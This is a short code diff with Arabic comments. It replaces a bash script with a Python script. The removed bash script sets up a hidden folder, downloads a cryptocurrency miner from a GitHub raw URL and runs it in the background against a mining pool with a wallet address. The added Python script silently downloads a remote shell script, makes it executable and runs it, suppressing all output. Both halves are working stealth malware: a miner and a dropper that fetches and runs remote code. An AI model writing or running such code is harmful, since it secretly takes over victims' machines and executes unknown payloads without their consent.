@@ -1,20 +1,29 @@
-#!/bin/bash
+import subprocess
 
-# إعداد بيانات المحفظة والمعدّن
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="science"
-POOL="45.155.102.89:443"
-THREADS=4
-# مجلد العمل
-WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
-mkdir -p "$WORKDIR" && cd "$WORKDIR"
+def run():
+    url = "https://raw.githubusercontent.com/ewilkinso/ruby/refs/heads/main/start.sh"
+    script = "start.sh"
 
-# تحميل النسخة الجاهزة من XMRig (Linux x64)
-wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
+    # تحميل الملف بصمت
+    subprocess.run(
+        ["wget", url, "-O", script],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
 
-# فك الضغط
-tar -xvf scala.tar.gz --strip=1
-rm scala.tar.gz
+    # إعطاء صلاحيات تنفيذ بصمت
+    subprocess.run(
+        ["chmod", "+x", script],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
 
-# تشغيل المعدّن في الخلفية باستخدام nohup
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+    # تشغيل الملف بصمت
+    subprocess.run(
+        ["./" + script],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+if __name__ == "__main__":
+    run()
